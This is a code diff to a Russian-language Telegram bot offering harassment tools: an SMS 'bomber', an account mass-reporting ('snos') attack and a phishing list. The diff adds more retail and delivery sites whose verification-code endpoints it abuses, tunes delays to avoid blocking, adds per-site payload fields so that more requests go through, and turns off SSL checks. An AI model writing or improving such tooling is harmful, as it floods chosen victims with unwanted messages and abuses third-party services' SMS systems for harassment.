@@ -11,6 +11,7 @@ import re
 import hashlib
 from datetime import datetime
 from typing import Optional, Dict, List, Tuple
+import asyncio
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -42,7 +43,7 @@ SESSION_DELAY = 60
 SMS_PER_ROUND = 100
 ROUND_DELAY = 5
 MAX_ROUNDS = 10
-BOMBER_DELAY = 2
+BOMBER_DELAY = 3  # Увеличьте задержку между кругами до 3 секунд
 SITE_DELAY = 10
 
 BANNER_PATH = "banner.png"
@@ -99,6 +100,11 @@ BOMBER_WEBSITES = [
     {"url": "https://youla.ru/api/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Youla"},
     {"url": "https://api.ozon.ru/v1/auth/request-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
     {"url": "https://api.wildberries.ru/webapi/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
+    {"url": "https://api.lenta.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
+    {"url": "https://api.perekrestok.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Perekrestok"},
+    {"url": "https://api.magnit.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Magnit"},
+    {"url": "https://api.sbermarket.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
+    {"url": "https://api.utkonos.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Utkonos"},
 ]
 
 SNOS_REPORT_REASONS = {
@@ -646,20 +652,43 @@ async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio
     return ok
 
 
-# ---------- БОМБЕР ----------
+# ---------- БОМБЕР (ИСПРАВЛЕННЫЙ) ----------
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
-    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
-    clean_phone = phone.replace("+", "")
+    headers = {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': site.get('url', '').split('/api')[0] if '/api' in site.get('url', '') else 'https://' + site.get('url', '').split('/')[2]
+    }
+    clean_phone = phone.replace("+", "").replace(" ", "").replace("-", "")
     
     try:
         data = {site["phone_field"]: clean_phone}
+        
+        # Добавляем дополнительные поля для некоторых сайтов
+        if site["name"] == "Delivery Club":
+            data["type"] = "auth"
+        elif site["name"] == "Samokat":
+            data["type"] = "phone"
+        elif site["name"] == "Tinkoff":
+            data = {"phone": clean_phone}
+        elif site["name"] == "Avito":
+            data = {"phone": clean_phone, "type": "call"}
+        elif site["name"] == "Wildberries":
+            data = {"phone": clean_phone, "type": "sms"}
+        elif site["name"] == "Ozon":
+            data = {"phone": clean_phone, "operation": "register"}
+        
+        timeout = aiohttp.ClientTimeout(total=15)
         if site["method"] == "POST":
-            async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
-                return {"site": site["name"], "success": True}
+            async with session.post(site["url"], headers=headers, json=data, timeout=timeout, ssl=False) as resp:
+                return {"site": site["name"], "success": resp.status < 500}
         else:
-            async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
-                return {"site": site["name"], "success": True}
-    except:
+            async with session.get(site["url"], headers=headers, params=data, timeout=timeout, ssl=False) as resp:
+                return {"site": site["name"], "success": resp.status < 500}
+    except asyncio.TimeoutError:
+        return {"site": site["name"], "success": False}
+    except Exception as e:
         return {"site": site["name"], "success": False}
 
 async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
@@ -669,20 +698,28 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
         phone = "+" + phone
     add_log(user_id, "Бомбер", phone)
     
-    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=100, force_close=True, enable_cleanup_closed=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as sess:
         for rnd in range(1, rounds + 1):
             if stop_event.is_set():
                 break
             
             tasks = []
+            # Отправляем по 2 запроса на каждый сайт за круг
             for site in BOMBER_WEBSITES:
-                for _ in range(3):
+                for _ in range(2):
                     tasks.append(send_bomber_request(sess, phone, site))
             
-            batch = await asyncio.gather(*tasks, return_exceptions=True)
+            # Запускаем задачи с задержкой между ними чтобы избежать блокировок
+            batch_results = []
+            for task in tasks:
+                if stop_event.is_set():
+                    break
+                result = await task
+                batch_results.append(result)
+                await asyncio.sleep(0.3)  # Небольшая задержка между запросами
             
-            for r in batch:
+            for r in batch_results:
                 if isinstance(r, dict) and r.get("success"):
                     ok += 1
             
@@ -1439,24 +1476,27 @@ async def phish_list(cb: types.CallbackQuery):
 @dp.callback_query(F.data == "stop")
 async def stop(cb: types.CallbackQuery):
     user_id = cb.from_user.id
-    stopped = False
+    stopped = []
     
     if user_id in active_attacks:
         active_attacks[user_id]["stop_event"].set()
         del active_attacks[user_id]
-        stopped = True
+        stopped.append("Снос")
     
     if user_id in active_bombers:
         active_bombers[user_id]["stop_event"].set()
         del active_bombers[user_id]
-        stopped = True
+        stopped.append("Бомбер")
     
     if user_id in active_snos_account:
         active_snos_account[user_id]["stop_event"].set()
         del active_snos_account[user_id]
-        stopped = True
+        stopped.append("Снос аккаунта")
     
-    await edit_message_with_banner(cb, "<b>ОСТАНОВЛЕНО</b>" if stopped else "<b>НЕТ АКТИВНЫХ АТАК</b>", get_main_menu())
+    if stopped:
+        await edit_message_with_banner(cb, f"<b>ОСТАНОВЛЕНО: {', '.join(stopped)}</b>", get_main_menu())
+    else:
+        await edit_message_with_banner(cb, "<b>НЕТ АКТИВНЫХ АТАК</b>", get_main_menu())
 
 @dp.message(F.photo)
 async def handle_photo(msg: types.Message):
